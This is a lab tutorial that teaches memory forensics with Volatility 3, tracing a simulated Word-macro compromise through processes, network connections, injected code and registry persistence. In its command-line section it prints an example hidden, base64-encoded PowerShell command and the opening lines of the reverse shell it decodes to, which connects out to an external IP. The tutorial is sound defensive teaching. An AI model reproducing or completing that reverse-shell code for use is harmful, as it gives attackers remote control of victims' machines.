# Demo 03: Digital Forensics Basics with Volatility (Memory Analysis)

> **Duration:** ~45 minutes
> **Level:** Intermediate
> **Tools:** Docker, Volatility 3, pre-prepared memory sample
> **Goal:** Perform basic memory forensics to identify malware artifacts in a captured RAM dump.

---

## Overview

This demo uses a sandboxed Docker environment with Volatility 3 pre-installed and a synthetic memory image that contains artifacts of a simulated compromise.
Students will analyze the memory image to identify:

* Suspicious running processes
* Injected code (process hollowing / malfind)
* Active network connections at time of capture
* PowerShell command-line evidence
* Attacker tools loaded in memory

**Key principle demonstrated:** Memory forensics can reveal attacker presence even when malware is fileless or has been cleaned from disk.

---

## Prerequisites

* Docker and Docker Compose installed
* ~4 GB free disk space (for the memory sample)
* Familiarity with command-line tools

---

## Lab Setup

### docker-compose.yml

```yaml
version: "3.8"
services:
  volatility-lab:
    image: python:3.11-slim
    container_name: volatility-lab
    volumes:
      - ./memory-samples:/samples:ro
      - ./output:/output
      - ./scripts:/scripts
    working_dir: /work
    command: >
      bash -c "
        pip install volatility3 --quiet &&
        cd /work &&
        echo 'Volatility 3 ready. Run: python vol.py --help' &&
        tail -f /dev/null
      "
    networks:
      - forensics-net

networks:
  forensics-net:
    driver: bridge
```

### Starting the Lab

```console
# Create output directory
mkdir -p output memory-samples scripts

# Start the lab environment
docker compose up -d

# Verify Volatility is installed
docker exec volatility-lab python -c "import volatility3; print(volatility3.__version__)"

# Enter the container shell
docker exec -it volatility-lab bash
```

> **Note on memory samples:** For this lab, use the publicly available memory image from the Volatility Foundation test suite, or download a CTF memory image that contains Windows artifacts. Recommended: `MemLabs` samples from github.com/stuxnet999/MemLabs

---

## Part 1: Memory Acquisition (Concept + Commands)

Before analysis, we must capture the memory.
In a live incident, this happens on the affected host **before** any containment action.

### Windows Memory Acquisition

```powershell
# Option 1: WinPMEM (open-source, recommended)
# Download from: https://github.com/Velocidex/WinPmem/releases
winpmem_mini_x64_rc2.exe -o C:\evidence\memory.raw

# Option 2: Magnet RAM Capture (GUI, free)
# Download from: magnetforensics.com

# Option 3: DumpIt (single executable)
DumpIt.exe /output:C:\evidence\memory.dmp

# Always hash immediately after capture:
certutil -hashfile C:\evidence\memory.raw SHA256 > C:\evidence\memory.raw.sha256
```

### Linux Memory Acquisition

```console
# Option 1: LiME (Linux Memory Extractor) — kernel module
sudo insmod lime-$(uname -r).ko "path=/mnt/usb/memory.lime format=lime"

# Option 2: /proc/kcore (limited — only works on some systems)
sudo cp /proc/kcore /mnt/usb/kcore.img

# Option 3: Avml (Azure-compatible, modern)
sudo avml /mnt/usb/memory.avml

# Hash immediately
sha256sum /mnt/usb/memory.lime > /mnt/usb/memory.lime.sha256
```

### Chain of Custody Documentation

```text
EVIDENCE CAPTURE RECORD
═══════════════════════════════════════════════════════════════
Evidence ID:      EVID-MEM-001
Incident ID:      INC-2025-0042
Hostname:         FINANCE-WS-042
OS:               Windows 10 Pro 22H2
RAM:              16 GB
Capture Tool:     WinPMEM v4.0.rc1
Output File:      memory.raw
File Size:        17,179,869,184 bytes (16 GB)
SHA-256:          a3f4e5b6c7d8... [full hash]
Capture Time:     2025-04-10 09:15:23 UTC
Captured By:      J. Garcia, Tier 2 Analyst
Chain: J.Garcia → Encrypted NAS /evidence/INC-2025-0042/memory.raw
═══════════════════════════════════════════════════════════════
```

---

## Part 2: Basic Process Analysis

```bash
# Inside the volatility-lab container (adjust path to your sample)
cd /work
pip install volatility3

# Set memory image path
MEMORY=/samples/memory.raw

# List all running processes (pslist — uses PEB linked list)
python3 vol.py -f $MEMORY windows.pslist

# Example output interpretation:
# PID   PPID  Name              Offset      Threads  Handles  Created
# 4     0     System            0xe000...   78       -        -
# 316   4     smss.exe          0xe001...   2        -        2024-11-14 08:01
# 552   544   csrss.exe         0xe002...   12       -        2024-11-14 08:02
# 1234  1024  powershell.exe    0xe123...   8        -        2024-11-14 14:30  ← suspicious
# 1235  1234  cmd.exe           0xe124...   3        -        2024-11-14 14:30  ← child of PS

# Process tree (shows parent-child relationships — better for spotting anomalies)
python3 vol.py -f $MEMORY windows.pstree
```

### What to Look For

```text
SUSPICIOUS PROCESS INDICATORS:
□ Unexpected parent-child relationships
  (e.g., Word spawning PowerShell, Explorer spawning cmd.exe)
□ Processes in wrong directories
  (e.g., svchost.exe NOT in C:\Windows\System32)
□ Processes with no disk backing
  (injected code, shellcode running in legitimate process space)
□ Multiple instances of usually single-instance processes
  (multiple lsass.exe is a red flag)
□ Processes with unusual command-line arguments
  (encoded PS commands, unusual flags)
```

---

## Part 3: Command-Line Analysis

```bash
# Show command-line arguments for all processes
python3 vol.py -f $MEMORY windows.cmdline

# Example suspicious output:
# Process: powershell.exe PID 1234
# Command: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...

# Decode the base64-encoded command:
echo "JABjAGwAaQBlAG4AdAA..." | base64 -d | python3 -c "import sys; sys.stdout.buffer.write(sys.stdin.buffer.read().decode('utf-16-le').encode('utf-8'))"

# Expected decoded output (example):
# $client = New-Object System.Net.Sockets.TCPClient('185.220.101.73', 443);
# $stream = $client.GetStream();
# [byte[]]$bytes = 0..65535|%{0};
# ... (reverse shell code)
```

---

## Part 4: Network Connection Analysis

```bash
# Active and recently closed network connections
python3 vol.py -f $MEMORY windows.netstat

# Example output:
# Offset   Proto  LocalAddr         LocalPort  ForeignAddr       ForeignPort  State      PID  Owner
# 0xe0a... TCPv4  10.0.1.42         49821      185.220.101.73    443          ESTABLISHED 1234 powershell.exe
# 0xe0b... TCPv4  10.0.1.42         49822      10.0.1.1          445          CLOSED      1235 cmd.exe

# Key: powershell.exe with ESTABLISHED connection to external IP on 443
# Even though 443 is HTTPS port, PS connecting outbound to a VPS is suspicious

# Get more detail on the connection
python3 vol.py -f $MEMORY windows.netstat | grep "185.220.101.73"
```

---

## Part 5: Detecting Process Injection (malfind)

Process injection is a technique attackers use to run code inside a legitimate process. `malfind` detects memory regions that are:

* Marked as executable (PAGE_EXECUTE_READWRITE)
* Not backed by a file on disk (anonymous memory)
* Contain shellcode patterns

```bash
# Scan all processes for injected code
python3 vol.py -f $MEMORY windows.malfind

# Example output:
# Process:  explorer.exe   PID: 2456
# Start VPN: 0x7f000000    End: 0x7f002000
# Tag:  VadS
# Protection: PAGE_EXECUTE_READWRITE
# Hexdump:
#   4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............
# [MZ header = Windows PE — this is injected code!]

# Dump the suspicious region for further analysis
python3 vol.py -f $MEMORY windows.malfind --pid 2456 --dump

# The dumped .dmp files can then be analyzed with:
# - strings: extract readable strings
# - FLOSS: extract obfuscated strings
# - Binary analysis (Ghidra, IDA)
```

---

## Part 6: DLL Analysis

Attackers often achieve persistence via DLL injection or side-loading.
Examine loaded DLLs for suspicious entries:

```bash
# List DLLs loaded by a suspicious process
python3 vol.py -f $MEMORY windows.dlllist --pid 1234

# Look for:
# 1. DLLs in Temp or AppData directories
# 2. DLLs with no path (loaded from memory)
# 3. DLLs with suspicious names similar to legitimate ones
#    (e.g., winsock32.dll instead of wsock32.dll)
# 4. DLLs with unusual base addresses

# Example suspicious entry:
# 0x7f100000  C:\Users\anna.schmidt\AppData\Local\Temp\winsock32.dll
```

---

## Part 7: Registry Analysis in Memory

Even if the attacker deleted registry keys, they may still exist in the in-memory registry hive:

```bash
# List registry hives loaded in memory
python3 vol.py -f $MEMORY windows.registry.hivelist

# Print keys from a specific hive
# Example: Check Run keys for persistence
python3 vol.py -f $MEMORY windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Example suspicious output:
# Key: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Last Written: 2024-11-14 14:31:05 UTC
# Values:
#   SysUpdate: C:\Users\anna.schmidt\AppData\Roaming\svchost32.exe
#   [Legitimate svchost.exe is NEVER in AppData — this is persistence!]
```

---

## Part 8: File Scan and Extraction

```bash
# Scan for files in memory (includes recently deleted files)
python3 vol.py -f $MEMORY windows.filescan | grep -i "\.exe\|\.dll\|\.ps1"

# Extract a specific file by physical address
python3 vol.py -f $MEMORY windows.dumpfiles --physaddr 0x1a2b3c4d00

# Extract file by name pattern
python3 vol.py -f $MEMORY windows.dumpfiles --filter "svchost32.exe"
```

---

## Part 9: Investigation Summary

After completing the above analysis, build your investigation summary:

```text
MEMORY FORENSICS INVESTIGATION SUMMARY
═══════════════════════════════════════
Incident:    INC-2025-0042
Analyst:     J. Garcia
Date:        2025-04-10
Evidence:    EVID-MEM-001 (memory.raw, SHA-256: a3f4e5b...)

FINDINGS:

1. SUSPICIOUS PROCESS

   Process: powershell.exe (PID 1234)
   Parent:  WINWORD.EXE (PID 996) — Word spawned PowerShell (unusual)
   Cmd:     -nop -w hidden -enc [base64 reverse shell]

2. ACTIVE C2 CONNECTION (at time of capture)
   powershell.exe → 185.220.101.73:443 (ESTABLISHED)

3. PROCESS INJECTION DETECTED
   explorer.exe (PID 2456) — PE injected at 0x7f000000
   MZ header confirms Windows PE file injected into Explorer

4. PERSISTENCE MECHANISM
   Registry: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   Value: SysUpdate = C:\Users\anna.schmidt\AppData\Roaming\svchost32.exe
   Timestamp: 14:31 UTC (1 minute after initial execution)

CONCLUSION:
  Attacker gained initial access via Word macro (Supplier_Invoice_April.docx)
  Established Cobalt Strike beacon connecting to 185.220.101.73:443
  Injected code into explorer.exe for stealth
  Established persistence via Run key registry value

RECOMMENDATIONS:

  1. Contain: EDR isolate FINANCE-WS-042

  2. Preserve: Disk image before remediation
  3. Eradicate: Rebuild system (cannot trust after code injection)
  4. Hunt: Search all endpoints for svchost32.exe in AppData
  5. Block: 185.220.101.73 at perimeter; hash of svchost32.exe in EDR
═══════════════════════════════════════
```

---

## Lab Cleanup

```console
# Exit the container
exit

# Stop and remove containers
docker compose down -v
```

---

## Key Takeaways

1. **Memory forensics reveals what disk forensics misses** — injected code, encrypted C2 channels, fileless malware, and recently deleted persistence mechanisms all leave traces in RAM.

1. **The order of volatility is not theoretical** — in this lab, we would have lost the active C2 connection (finding #2) if containment had happened before memory capture.

1. **Process relationships tell the story** — Word spawning PowerShell is the core detection insight. `pstree` makes this visible immediately.

1. **malfind is your injection detector** — MZ headers in non-file-backed memory = injected PE. This is a high-confidence malware indicator.

1. **Registry in memory survives disk cleanup** — if an attacker deletes a persistence key from disk, the memory hive still shows it. Always analyze memory if disk forensics seems incomplete.

---

## Additional Practice

* Download MemLabs challenges: `github.com/stuxnet999/MemLabs`
* Try Volatility plugin: `windows.handles` to see all object handles for a process
* Practice `windows.shimcache` for application execution history from memory
* Explore `windows.callbacks` to detect rootkit kernel hooks
